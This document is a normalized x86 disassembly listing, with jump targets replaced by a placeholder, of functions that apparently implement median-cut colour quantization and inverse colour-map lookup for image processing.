dec [ edx ]
sub_4913f4
push ebx
push esi
push edi
xor ebx ebx
xor edi edi
xor ecx ecx
cmp edx ecx
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x1c ]
cmp ebx esi
jge r-xdata
inc ecx
add eax 0x20
cmp edx ecx
jg r-xdata
cmp [ eax + 0x18 ] 0x0
jle r-xdata
mov edi eax
mov ebx esi
sub_491420
push ebx
push esi
push edi
xor ebx ebx
xor edi edi
xor ecx ecx
cmp edx ecx
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x18 ]
cmp ebx esi
jge r-xdata
inc ecx
add eax 0x20
cmp edx ecx
jg r-xdata
mov edi eax
mov ebx esi
sub_491448
push ebx
push esi
push edi
add esp 0xffffffb8
mov [ esp ] edx
mov eax [ eax + 0x1cc ]
mov eax [ eax + 0x18 ]
mov [ esp + 0x4 ] eax
mov edx [ esp ]
mov ecx [ edx ]
mov [ esp + 0x8 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x4 ]
mov [ esp + 0xc ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x8 ]
mov [ esp + 0x10 ] eax
mov edx [ esp ]
mov ecx [ edx + 0xc ]
mov [ esp + 0x14 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x10 ]
mov [ esp + 0x18 ] edx
mov ecx [ esp ]
mov esi [ ecx + 0x14 ]
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x8 ]
jle r-xdata
mov ecx [ esp + 0xc ]
cmp ecx [ esp + 0x8 ]
jle r-xdata
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
lea eax [ ecx + edx * 4 ]
mov [ esp + 0x24 ] eax
cmp edx [ esp + 0xc ]
jg r-xdata
mov ecx [ esp + 0x14 ]
cmp ecx [ esp + 0x10 ]
jle r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
lea ecx [ eax + edx * 4 ]
mov [ esp + 0x2c ] ecx
cmp edx [ esp + 0x8 ]
jl r-xdata
mov ebx [ esp + 0x10 ]
mov eax [ esp + 0x24 ]
mov ecx eax
mov [ esp + 0x20 ] ecx
cmp ebx [ esp + 0x14 ]
jg r-xdata
mov edx [ esp + 0x14 ]
cmp edx [ esp + 0x10 ]
jle r-xdata
mov ebx [ esp + 0x10 ]
cmp ebx [ esp + 0x14 ]
jg r-xdata
mov ebx [ esp + 0x10 ]
mov eax [ esp + 0x2c ]
mov ecx eax
mov [ esp + 0x28 ] ecx
cmp ebx [ esp + 0x14 ]
jg r-xdata
inc edx
add [ esp + 0x24 ] 0x4
cmp edx [ esp + 0xc ]
jle r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ eax ]
mov eax ebx
shl eax 0x6
add ecx eax
mov eax [ esp + 0x18 ]
add eax eax
add ecx eax
mov eax [ esp + 0x18 ]
cmp esi eax
jl r-xdata
cmp esi [ esp + 0x18 ]
jle r-xdata
mov ebx [ esp + 0x14 ]
cmp ebx [ esp + 0x10 ]
jl r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
lea ecx [ eax + edx * 4 ]
mov [ esp + 0x30 ] ecx
cmp edx [ esp + 0xc ]
jg r-xdata
dec edx
add [ esp + 0x2c ] 0xfffffffc
cmp edx [ esp + 0x8 ]
jge r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ eax ]
mov eax ebx
shl eax 0x6
add ecx eax
mov eax [ esp + 0x18 ]
add eax eax
add ecx eax
mov eax [ esp + 0x18 ]
cmp esi eax
jl r-xdata
inc ebx
cmp ebx [ esp + 0x14 ]
jle r-xdata
mov di [ ecx ]
add ecx 0x2
test di di
je r-xdata
cmp esi [ esp + 0x18 ]
jle r-xdata
mov eax [ esp + 0x18 ]
cmp esi eax
jl r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
lea ecx [ eax + edx * 4 ]
mov [ esp + 0x34 ] ecx
cmp edx [ esp + 0xc ]
jg r-xdata
inc ebx
cmp ebx [ esp + 0x14 ]
jle r-xdata
mov eax [ esp + 0x30 ]
mov ecx [ eax ]
mov eax ebx
shl eax 0x6
add ecx eax
mov eax [ esp + 0x18 ]
add eax eax
add ecx eax
mov eax [ esp + 0x18 ]
cmp esi eax
jl r-xdata
inc ebx
cmp ebx [ esp + 0x14 ]
jle r-xdata
mov di [ ecx ]
add ecx 0x2
test di di
je r-xdata
inc eax
cmp esi eax
jge r-xdata
mov [ esp + 0x8 ] edx
mov eax [ esp ]
mov [ eax ] edx
jmp r-xdata
mov eax [ esp + 0xc ]
mov edx [ esp + 0x14 ]
sub eax [ esp + 0x8 ]
sub edx [ esp + 0x10 ]
shl eax 0x3
mov ecx esi
mov ebx eax
imul ebx eax
shl edx 0x2
sub ecx [ esp + 0x18 ]
shl ecx 0x3
add ecx ecx
lea edx [ edx + edx * 2 ]
mov eax edx
imul edx
mov edx ecx
add ebx eax
imul edx ecx
mov ecx [ esp ]
add ebx edx
xor eax eax
mov [ ecx + 0x18 ] ebx
mov [ esp + 0x1c ] eax
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
lea eax [ ecx + edx * 4 ]
mov [ esp + 0x44 ] eax
cmp edx [ esp + 0xc ]
jg r-xdata
mov eax esi
cmp eax [ esp + 0x18 ]
jl r-xdata
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
lea ecx [ ecx + edx * 4 ]
mov [ esp + 0x38 ] ecx
cmp edx [ esp + 0xc ]
jg r-xdata
dec ebx
cmp ebx [ esp + 0x10 ]
jge r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ eax ]
mov eax ebx
shl eax 0x6
add ecx eax
mov eax [ esp + 0x18 ]
add eax eax
add ecx eax
mov eax [ esp + 0x18 ]
cmp esi eax
jl r-xdata
inc edx
add [ esp + 0x30 ] 0x4
cmp edx [ esp + 0xc ]
jle r-xdata
mov di [ ecx ]
add ecx 0x2
test di di
je r-xdata
inc eax
cmp esi eax
jge r-xdata
mov [ esp + 0xc ] edx
mov eax [ esp ]
mov [ eax + 0x4 ] edx
jmp r-xdata
mov edx [ esp ]
mov ecx [ esp + 0x1c ]
mov [ edx + 0x1c ] ecx
add esp 0x48
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0x10 ]
mov eax [ esp + 0x44 ]
mov ecx eax
mov [ esp + 0x40 ] ecx
cmp ebx [ esp + 0x14 ]
jg r-xdata
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
lea ecx [ ecx + edx * 4 ]
mov [ esp + 0x3c ] ecx
cmp edx [ esp + 0xc ]
jg r-xdata
inc eax
cmp esi eax
jge r-xdata
mov ecx [ esp + 0x38 ]
mov ebx [ esp + 0x10 ]
shl ebx 0x6
mov ecx [ ecx ]
add ecx ebx
mov ebx eax
add ebx ebx
add ecx ebx
mov ebx [ esp + 0x10 ]
cmp ebx [ esp + 0x14 ]
jg r-xdata
inc edx
add [ esp + 0x34 ] 0x4
cmp edx [ esp + 0xc ]
jle r-xdata
mov di [ ecx ]
add ecx 0x2
test di di
je r-xdata
inc eax
cmp esi eax
jge r-xdata
mov [ esp + 0x10 ] ebx
mov eax [ esp ]
mov [ eax + 0x8 ] ebx
jmp r-xdata
inc edx
add [ esp + 0x44 ] 0x4
cmp edx [ esp + 0xc ]
jle r-xdata
mov eax [ esp + 0x40 ]
mov ecx [ eax ]
mov eax ebx
shl eax 0x6
add ecx eax
mov eax [ esp + 0x18 ]
add eax eax
add ecx eax
mov eax [ esp + 0x18 ]
cmp esi eax
jl r-xdata
dec eax
cmp eax [ esp + 0x18 ]
jge r-xdata
mov ecx [ esp + 0x3c ]
mov ebx [ esp + 0x10 ]
shl ebx 0x6
mov ecx [ ecx ]
add ecx ebx
mov ebx eax
add ebx ebx
add ecx ebx
mov ebx [ esp + 0x10 ]
cmp ebx [ esp + 0x14 ]
jg r-xdata
inc edx
add [ esp + 0x38 ] 0x4
cmp edx [ esp + 0xc ]
jle r-xdata
cmp [ ecx ] 0x0
je r-xdata
inc eax
cmp esi eax
jge r-xdata
mov [ esp + 0x14 ] ebx
mov eax [ esp ]
mov [ eax + 0xc ] ebx
jmp r-xdata
inc ebx
cmp ebx [ esp + 0x14 ]
jle r-xdata
cmp [ ecx ] 0x0
je r-xdata
inc edx
add [ esp + 0x3c ] 0x4
cmp edx [ esp + 0xc ]
jle r-xdata
cmp [ ecx ] 0x0
je r-xdata
inc ebx
add ecx 0x40
cmp ebx [ esp + 0x14 ]
jle r-xdata
mov [ esp + 0x18 ] eax
mov edx [ esp ]
mov [ edx + 0x10 ] eax
jmp r-xdata
inc eax
add ecx 0x2
cmp esi eax
jge r-xdata
inc [ esp + 0x1c ]
inc ebx
add ecx 0x40
cmp ebx [ esp + 0x14 ]
jle r-xdata
mov esi eax
mov edx [ esp ]
mov [ edx + 0x14 ] eax
jmp r-xdata
sub_491818
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp esi [ ebp + 0x8 ]
jge r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
add eax eax
cmp eax [ ebp + 0x8 ]
jg r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_491420
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4913f4
jmp r-xdata
mov ebx esi
shl ebx 0x5
add ebx [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov [ ebx + 0x4 ] edx
mov ecx [ eax + 0xc ]
mov [ ebx + 0xc ] ecx
mov edx [ eax + 0x14 ]
mov [ ebx + 0x14 ] edx
mov ecx [ eax ]
mov [ ebx ] ecx
mov edx [ eax + 0x8 ]
mov [ ebx + 0x8 ] edx
mov ecx [ eax + 0x10 ]
mov [ ebx + 0x10 ] ecx
mov edx [ eax + 0x4 ]
sub edx [ eax ]
shl edx 0x3
mov [ ebp - 0xc ] edx
mov ecx [ eax + 0xc ]
sub ecx [ eax + 0x8 ]
shl ecx 0x2
lea edx [ ecx + ecx * 2 ]
mov ecx [ eax + 0x14 ]
sub ecx [ eax + 0x10 ]
shl ecx 0x3
add ecx ecx
mov [ ebp - 0x10 ] ecx
mov ecx 0x1
cmp edx [ ebp - 0x10 ]
jge r-xdata
test eax eax
je r-xdata
cmp edx [ ebp - 0xc ]
jge r-xdata
mov edx [ ebp - 0x10 ]
mov ecx 0x2
sub ecx 0x1
jb r-xdata
xor ecx ecx
mov edx [ eax + 0x4 ]
add edx [ eax ]
sar edx 0x1
jns r-xdata
je r-xdata
mov [ eax + 0x4 ] edx
inc edx
mov [ ebx ] edx
jmp r-xdata
adc edx 0x0
mov edx [ eax + 0xc ]
add edx [ eax + 0x8 ]
sar edx 0x1
jns r-xdata
dec ecx
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_491448
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_491448
inc esi
cmp esi [ ebp + 0x8 ]
jl r-xdata
mov [ eax + 0xc ] edx
inc edx
mov [ ebx + 0x8 ] edx
jmp r-xdata
adc edx 0x0
mov edx [ eax + 0x14 ]
add edx [ eax + 0x10 ]
sar edx 0x1
jns r-xdata
jmp r-xdata
mov [ eax + 0x14 ] edx
inc edx
mov [ ebx + 0x10 ] edx
adc edx 0x0
sub_491934
push ebx
push esi
push edi
push ebp
add esp 0xffffffd0
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov eax [ eax + 0x1cc ]
mov eax [ eax + 0x18 ]
mov [ esp + 0x18 ] ecx
xor ecx ecx
mov [ esp + 0x1c ] ecx
xor ecx ecx
mov [ esp + 0x20 ] ecx
xor ecx ecx
mov [ esp + 0x24 ] ecx
mov ecx [ edx ]
mov ebx [ edx + 0x4 ]
mov [ esp + 0x8 ] ebx
mov ebx [ edx + 0x8 ]
lea eax [ eax + ecx * 4 ]
mov [ esp + 0xc ] ebx
mov ebx [ edx + 0xc ]
mov [ esp + 0x10 ] ebx
mov ebx [ edx + 0x10 ]
mov [ esp + 0x14 ] ebx
mov esi [ edx + 0x14 ]
mov [ esp + 0x2c ] eax
cmp ecx [ esp + 0x8 ]
jg r-xdata
mov ecx [ esp + 0x18 ]
sar ecx 0x1
mov eax ecx
add eax [ esp + 0x1c ]
cdq
idiv [ esp + 0x18 ]
mov edx [ esp ]
mov ebx [ edx + 0x88 ]
mov edx [ ebx ]
mov esi [ esp + 0x4 ]
mov [ edx + esi ] al
mov eax ecx
add eax [ esp + 0x20 ]
cdq
idiv [ esp + 0x18 ]
mov edx [ ebx + 0x4 ]
mov esi [ esp + 0x4 ]
mov [ edx + esi ] al
mov eax ecx
add eax [ esp + 0x24 ]
cdq
idiv [ esp + 0x18 ]
mov ecx [ ebx + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ ecx + edx ] al
add esp 0x30
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
mov eax [ esp + 0x2c ]
mov edx eax
mov [ esp + 0x28 ] edx
cmp ebx [ esp + 0x10 ]
jg r-xdata
inc ecx
add [ esp + 0x2c ] 0x4
cmp ecx [ esp + 0x8 ]
jle r-xdata
mov eax [ esp + 0x28 ]
mov edi [ eax ]
mov eax ebx
shl eax 0x6
add edi eax
mov edx [ esp + 0x14 ]
add edx edx
add edi edx
mov edx [ esp + 0x14 ]
cmp esi edx
jl r-xdata
inc ebx
cmp ebx [ esp + 0x10 ]
jle r-xdata
mov ax [ edi ]
add edi 0x2
movzx eax ax
test eax eax
je r-xdata
inc edx
cmp esi edx
jge r-xdata
add [ esp + 0x18 ] eax
mov ebp ecx
shl ebp 0x3
add ebp 0x4
imul ebp eax
add [ esp + 0x1c ] ebp
mov ebp ebx
shl ebp 0x2
add ebp 0x2
imul ebp eax
add [ esp + 0x20 ] ebp
mov ebp edx
shl ebp 0x3
add ebp 0x4
imul ebp eax
add [ esp + 0x24 ] ebp
sub_491a78
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov ebx edx
push ebp
mov ecx ebx
mov esi [ eax + 0x4 ]
mov edx 0x1
shl ecx 0x5
call [ esi ]
mov esi eax
xor eax eax
xor edx edx
xor ecx ecx
mov [ esi ] eax
mov eax edi
mov [ esi + 0x4 ] 0x1f
mov [ esi + 0x8 ] edx
mov edx esi
mov [ esi + 0xc ] 0x3f
mov [ esi + 0x10 ] ecx
mov ebp 0x1
mov [ esi + 0x14 ] 0x1f
call sub_491448
push ebx
mov ecx ebp
mov edx esi
mov eax edi
call sub_491818
mov ebp eax
xor ebx ebx
cmp ebp ebx
jle r-xdata
mov [ edi + 0x84 ] ebp
mov edx 0x1
mov eax [ edi ]
mov [ eax + 0x14 ] 0x60
mov [ eax + 0x18 ] ebp
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov ecx ebx
shl edx 0x5
mov eax edi
add edx esi
call sub_491934
inc ebx
cmp ebp ebx
jg r-xdata
sub_491b10
push ebp
mov ebp esp
add esp 0xfffffbc4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edx [ eax + 0x84 ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0x4 ]
add ecx 0x18
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x10 ]
sar edx 0x1
mov [ ebp - 0x1c ] edx
mov ecx [ ebp - 0x8 ]
add ecx 0x1c
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x14 ]
sar edx 0x1
mov [ ebp - 0x20 ] edx
mov ecx [ ebp + 0xc ]
add ecx 0x18
mov [ ebp - 0x18 ] ecx
xor ecx ecx
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x18 ]
sar edx 0x1
mov [ ebp - 0x24 ] edx
lea edx [ ebp - 0x43c ]
mov [ ebp - 0x2c ] 0x7fffffff
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x3c ] edx
mov ecx [ eax + 0x88 ]
mov edx [ ecx + 0x8 ]
mov ecx edx
mov [ ebp - 0x38 ] ecx
mov edx [ eax + 0x88 ]
mov ecx [ edx + 0x4 ]
mov edx ecx
mov [ ebp - 0x34 ] edx
mov eax [ eax + 0x88 ]
mov ecx [ eax ]
mov eax ecx
mov [ ebp - 0x30 ] eax
mov edx [ ebp - 0x28 ]
cmp edx [ ebp - 0xc ]
jge r-xdata
xor eax eax
xor ecx ecx
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x43c ]
mov ebx [ ebp - 0x28 ]
mov edx [ ebp + 0x8 ]
cmp ebx [ ebp - 0xc ]
jge r-xdata
mov ecx [ ebp - 0x30 ]
xor ebx ebx
mov bl [ ecx ]
cmp ebx [ ebp - 0x4 ]
jge r-xdata
mov eax ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ebx [ eax ]
cmp ebx [ ebp - 0x2c ]
jg r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
mov eax ebx
sub eax [ ebp - 0x4 ]
mov edx eax
imul edx eax
mov eax ebx
sub eax [ ebp - 0x10 ]
mov ecx eax
imul ecx eax
jmp r-xdata
inc [ ebp - 0x28 ]
add eax 0x4
mov ebx [ ebp - 0x28 ]
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov bl [ ebp - 0x28 ]
inc ecx
mov [ edx ] bl
inc edx
xor edx edx
cmp ebx [ ebp - 0x1c ]
jg r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
mov edx eax
imul edx eax
mov eax ebx
sub eax [ ebp - 0x4 ]
mov ecx eax
imul ecx eax
jmp r-xdata
mov eax [ ebp - 0x34 ]
xor ebx ebx
mov bl [ eax ]
cmp ebx [ ebp - 0x8 ]
jge r-xdata
mov eax ebx
sub eax [ ebp - 0x4 ]
mov ecx eax
imul ecx eax
mov eax ebx
sub eax [ ebp - 0x10 ]
mov ecx eax
imul ecx eax
jmp r-xdata
cmp ebx [ ebp - 0x14 ]
jle r-xdata
mov eax ebx
sub eax [ ebp - 0x8 ]
sub ebx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
mov esi eax
imul esi eax
lea eax [ ebx + ebx * 2 ]
add edx esi
mov ebx eax
imul ebx eax
add ecx ebx
jmp r-xdata
cmp ebx [ ebp - 0x20 ]
jg r-xdata
mov eax ebx
sub eax [ ebp - 0x14 ]
sub ebx [ ebp - 0x8 ]
lea eax [ eax + eax * 2 ]
mov esi eax
imul esi eax
lea eax [ ebx + ebx * 2 ]
add edx esi
mov ebx eax
imul ebx eax
add ecx ebx
jmp r-xdata
mov eax [ ebp - 0x38 ]
xor ebx ebx
mov bl [ eax ]
cmp ebx [ ebp + 0xc ]
jge r-xdata
sub ebx [ ebp - 0x8 ]
lea eax [ ebx + ebx * 2 ]
mov ebx eax
imul ebx eax
add ecx ebx
sub ebx [ ebp - 0x14 ]
lea eax [ ebx + ebx * 2 ]
mov ebx eax
imul ebx eax
add ecx ebx
jmp r-xdata
cmp ebx [ ebp - 0x18 ]
jle r-xdata
mov eax ebx
sub eax [ ebp + 0xc ]
add eax eax
mov esi eax
imul esi eax
add edx esi
mov eax ebx
sub eax [ ebp - 0x18 ]
add eax eax
mov ebx eax
imul ebx eax
add ecx ebx
jmp r-xdata
cmp ebx [ ebp - 0x24 ]
jg r-xdata
mov eax ebx
sub eax [ ebp - 0x18 ]
add eax eax
mov esi eax
imul esi eax
add edx esi
mov eax ebx
sub eax [ ebp + 0xc ]
add eax eax
mov ebx eax
imul ebx eax
add ecx ebx
jmp r-xdata
mov eax [ ebp - 0x3c ]
mov [ eax ] edx
cmp ecx [ ebp - 0x2c ]
jge r-xdata
mov eax ebx
sub eax [ ebp + 0xc ]
add eax eax
mov ebx eax
imul ebx eax
add ecx ebx
mov eax ebx
sub eax [ ebp - 0x18 ]
add eax eax
mov ebx eax
imul ebx eax
add ecx ebx
jmp r-xdata
inc [ ebp - 0x28 ]
add [ ebp - 0x3c ] 0x4
inc [ ebp - 0x38 ]
inc [ ebp - 0x34 ]
inc [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
cmp edx [ ebp - 0xc ]
jl r-xdata
mov [ ebp - 0x2c ] ecx
sub_491d50
push ebp
mov ebp esp
add esp 0xfffffdc4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x7f
lea ecx [ ebp - 0x23c ]
mov [ ecx ] 0x7fffffff
add ecx 0x4
dec [ ebp - 0x18 ]
cmp [ ebp - 0x18 ] 0x0
jge r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov edx [ ebp + 0xc ]
mov eax edx
mov [ ebp - 0x3c ] eax
mov edx [ ebp - 0x18 ]
cmp edx [ ebp + 0x10 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ ebp - 0x3c ]
xor eax eax
mov al [ ecx ]
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x1c ]
mov edx [ edx + 0x88 ]
mov eax [ edx ]
movzx eax [ eax + ecx ]
push eax
mov eax [ ebp - 0x8 ]
pop ecx
sub eax ecx
mov ecx eax
imul ecx eax
mov [ ebp - 0x24 ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ ebp - 0x1c ]
shl eax 0x4
movzx ecx [ ecx + ebx ]
mov ebx [ ebp - 0xc ]
add eax 0x40
sub ebx ecx
lea ecx [ ebx + ebx * 2 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x34 ]
imul ecx [ ebp - 0x34 ]
add [ ebp - 0x24 ] ecx
mov ecx [ ebp - 0x1c ]
mov edx [ edx + 0x8 ]
movzx edx [ edx + ecx ]
mov ecx [ ebp + 0x14 ]
sub ecx edx
add ecx ecx
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x38 ]
imul edx [ ebp - 0x38 ]
add [ ebp - 0x24 ] edx
mov edx [ ebp - 0x34 ]
shl edx 0x3
lea edx [ edx + edx * 2 ]
add edx 0x90
mov [ ebp - 0x34 ] edx
mov ecx [ ebp - 0x38 ]
shl ecx 0x5
add ecx 0x100
mov [ ebp - 0x38 ] ecx
lea ecx [ ebp - 0x23c ]
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x10 ] 0x3
add esi edx
add edx 0x200
add ecx 0x4
inc [ ebp - 0x20 ]
dec eax
test eax eax
jge r-xdata
mov [ ecx ] esi
mov bl [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
mov [ edi ] bl
cmp esi [ ecx ]
jge r-xdata
mov eax [ ebp - 0x30 ]
add [ ebp - 0x28 ] eax
add [ ebp - 0x30 ] 0x120
dec [ ebp - 0x14 ]
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
mov esi [ ebp - 0x28 ]
mov edx [ ebp - 0x38 ]
mov eax 0x3
mov edx [ ebp - 0x2c ]
add [ ebp - 0x24 ] edx
add [ ebp - 0x2c ] 0x80
dec [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x14 ] 0x7
inc [ ebp - 0x18 ]
inc [ ebp - 0x3c ]
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp + 0x10 ]
jl r-xdata
sub_491ec8
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebx + 0x1cc ]
lea ecx [ ebp - 0x114 ]
mov edx [ eax + 0x18 ]
mov [ ebp - 0xc ] edx
sar [ ebp - 0x4 ] 0x2
sar [ ebp - 0x8 ] 0x3
sar [ ebp + 0x8 ] 0x2
mov esi [ ebp - 0x4 ]
mov edi [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
shl edi 0x5
shl esi 0x5
add edi 0x2
shl eax 0x5
add esi 0x4
add eax 0x4
mov [ ebp - 0x10 ] eax
mov eax ebx
mov edx [ ebp - 0x10 ]
push edx
push ecx
mov ecx edi
mov edx esi
call sub_491b10
mov edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x194 ]
push edx
push eax
lea eax [ ebp - 0x114 ]
mov edx esi
push eax
push ecx
mov ecx edi
mov eax ebx
call sub_491d50
shl [ ebp - 0x4 ] 0x2
shl [ ebp - 0x8 ] 0x3
shl [ ebp + 0x8 ] 0x2
lea ecx [ ebp - 0x194 ]
xor eax eax
mov [ ebp - 0x14 ] eax
movzx esi [ ecx ]
inc esi
mov [ eax ] si
inc ecx
add eax 0x2
inc edx
cmp edx 0x4
jl r-xdata
inc ebx
cmp ebx 0x8
jl r-xdata
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ edx + eax * 4 ]
mov edx [ ebp - 0x8 ]
add edx ebx
shl edx 0x6
add eax edx
mov edx [ ebp + 0x8 ]
add edx edx
add eax edx
xor edx edx
inc [ ebp - 0x14 ]
cmp [ ebp - 0x14 ] 0x4
jl r-xdata
xor ebx ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_491fa8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1cc ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x14 ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
mov ebx [ edx ]
mov edx [ eax ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] ecx
cmp [ ebp - 0x18 ] 0x0
jbe r-xdata
inc [ ebp - 0x14 ]
add [ ebp - 0x24 ] 0x4
add [ ebp - 0x20 ] 0x4
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp + 0x8 ]
jl r-xdata
xor eax eax
xor edx edx
mov al [ ebx ]
inc ebx
xor ecx ecx
sar eax 0x3
mov dl [ ebx ]
inc ebx
sar edx 0x2
mov cl [ ebx ]
sar ecx 0x3
inc ebx
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x8 ]
mov esi [ ecx + eax * 4 ]
mov ecx edx
shl ecx 0x6
add esi ecx
mov ecx [ ebp - 0x10 ]
add ecx ecx
add esi ecx
cmp [ esi ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov al [ esi ]
add al 0xff
mov [ edx ] al
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
cmp [ ebp - 0x18 ] 0x0
ja r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
mov ecx edx
mov edx [ ebp - 0x4 ]
xchg edx eax
call sub_491ec8
sub_492074
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x1cc ]
mov [ ebp - 0x10 ] edx
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x70 ]
mov [ ebp - 0x50 ] ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x144 ]
mov [ ebp - 0x54 ] edx
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x28 ]
mov [ ebp - 0x58 ] eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x88 ]
mov eax [ ecx ]
mov [ ebp - 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x88 ]
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x60 ] eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x88 ]
xor edx edx
mov eax [ ecx + 0x8 ]
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x48 ] edx
mov ecx [ ebp - 0xc ]
mov eax ecx
mov [ ebp - 0x70 ] eax
mov edx [ ebp - 0x8 ]
mov ecx edx
mov [ ebp - 0x6c ] ecx
mov eax [ ebp - 0x48 ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x6c ]
mov ecx [ edx ]
mov [ ebp - 0x34 ] ecx
mov eax [ ebp - 0x70 ]
mov edx [ eax ]
mov [ ebp - 0x38 ] edx
mov ecx [ ebp - 0x10 ]
cmp [ ecx + 0x24 ] 0x0
je r-xdata
mov [ ebp - 0x40 ] 0x1
mov [ ebp - 0x44 ] 0x3
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + 0x20 ]
mov [ ebp - 0x30 ] eax
mov edx [ ebp - 0x10 ]
mov [ edx + 0x24 ] 0x1
mov eax [ ebp - 0x50 ]
dec eax
lea edx [ eax + eax * 2 ]
